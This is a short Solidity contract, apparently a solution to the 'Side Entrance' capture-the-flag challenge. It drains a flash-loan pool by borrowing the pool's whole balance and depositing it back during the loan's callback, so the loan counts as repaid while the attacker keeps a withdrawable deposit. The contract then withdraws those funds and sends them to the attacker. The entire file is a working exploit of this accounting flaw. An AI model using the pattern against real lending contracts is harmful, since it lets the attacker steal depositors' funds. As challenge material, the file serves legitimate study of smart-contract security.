// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;
    address payable attacker;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        attacker = payable(msg.sender);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
